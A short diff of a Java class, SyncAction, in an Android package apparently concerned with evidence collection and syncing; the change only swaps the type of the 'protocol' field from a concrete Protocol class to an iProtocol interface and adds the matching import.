@@ -25,6 +25,7 @@ import com.android.networking.action.sync.ZProtocol;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfAction;
 import com.android.networking.evidence.EvidenceCollector;
+import com.android.networking.interfaces.iProtocol;
 import com.android.networking.manager.ManagerModule;
 import com.android.networking.util.Check;
 
@@ -46,7 +47,7 @@ public abstract class SyncAction extends SubActionSlow {
 	protected Vector<Object> transports;
 
 	/** The protocol. */
-	protected Protocol protocol;
+	protected iProtocol protocol;
 
 	/** The initialized. */
 	protected boolean initialized;
